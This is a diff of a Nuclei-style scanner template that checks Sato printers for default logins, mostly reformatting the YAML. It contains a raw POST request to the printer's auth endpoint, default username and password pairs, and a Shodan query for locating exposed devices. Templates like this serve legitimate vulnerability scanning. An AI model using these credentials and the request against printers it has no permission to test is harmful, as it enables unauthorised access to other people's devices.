@@ -1,47 +1,51 @@
+http:
+- attack: pitchfork
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"r":0'
+    - groups":["user
+  - part: content_type
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - '0310'
+    - '6677'
+    username:
+    - settings
+    - service
+  raw:
+  - 'POST /WebConfig/lua/auth.lua HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Referer: {{BaseURL}}
+
+
+    group={{username}}&pw={{password}}
+
+    '
 id: sato-default-login
 info:
-  name: Sato - Default Login
   author: y0no
-  severity: high
-  description: |
-    Sato using default credentials was discovered.
+  description: 'Sato using default credentials was discovered.
+
+    '
   metadata:
-    runzero-match: any(each(service["html.titles"]), {# matches "Sato"})
     max-request: 1
+    runzero-match: any(each(service["html.titles"]), {# matches "Sato"})
     shodan-query: title:"Sato"
     verified: true
-  tags: default-login,intrusive,printer,sato,vuln
-http:
-  - attack: pitchfork
-    matchers:
-      - condition: and
-        part: body
-        type: word
-        words:
-          - '"r":0'
-          - groups":["user
-      - part: content_type
-        type: word
-        words:
-          - application/json
-      - status:
-          - 200
-        # digest: 4a0a00473045022100d16b8c27a3635252b598d24d4b4fdf4d0169a95424f86715b4e5eaf8ee90b1ac0220717bdec3b29cfa93cb2fdb67d7ff4d30dfcbf3c0ff0dbd33ecd580803f63b276:922c64590222798bb761d5b6d8e72950
-
-        type: status
-    matchers-condition: and
-    payloads:
-      password:
-        - "0310"
-        - "6677"
-      username:
-        - settings
-        - service
-    raw:
-      - |
-        POST /WebConfig/lua/auth.lua HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        Referer: {{BaseURL}}
-
-        group={{username}}&pw={{password}}
+  name: Sato - Default Login
+  severity: high
+  tags: default-login,printer,sato,vuln
